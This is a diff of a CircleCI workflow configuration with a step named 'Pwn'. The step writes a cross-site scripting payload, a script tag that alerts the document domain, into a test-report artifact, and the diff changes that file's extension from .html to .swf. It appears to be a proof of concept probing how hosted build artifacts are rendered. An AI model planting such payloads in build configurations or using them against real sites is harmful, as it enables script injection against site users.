@@ -17,7 +17,7 @@ jobs:
       - run:
           name: Pwn
           command: |
-              echo '<script>alert(document.domain)</script>' > '/home/circleci/project/test-reports/a.txt.html'
+              echo '<script>alert(document.domain)</script>' > '/home/circleci/project/test-reports/a.swf'
       - run:
           name: Download Selenium
           command: |
